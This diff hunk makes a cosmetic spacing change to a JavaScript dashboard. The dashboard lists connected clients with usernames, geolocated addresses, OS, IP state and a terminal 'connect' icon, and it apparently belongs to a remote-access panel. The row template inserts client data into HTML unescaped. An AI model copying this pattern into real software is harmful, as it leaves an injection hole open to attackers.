@@ -78,7 +78,7 @@ async function updateDevices() {
                   <td><input type="checkbox" class="row-select" data-row-id="${clientId}"></td>
                   <td>${clientData.username}</td>
                   <td>${clientData.geolocation.address}</td>
-                  <td>${clientData.status}<img src='`+image_url+`' alt='Online/Offline Logo'</td>
+                  <td>${clientData.status}&nbsp; <img src='`+image_url+`' alt='Online/Offline Logo'</td>
                   <td><img src="${osLogo}" type="os" alt="${osType}">${osType}</td>
                   <td>${ip_state}</td>
                   <td><img src='https://upload.wikimedia.org/wikipedia/commons/6/6f/Octicons-terminal.svg' id='connect' alt="Connect icon" class='terminal-icon' data-row-id="${clientId}"></td>
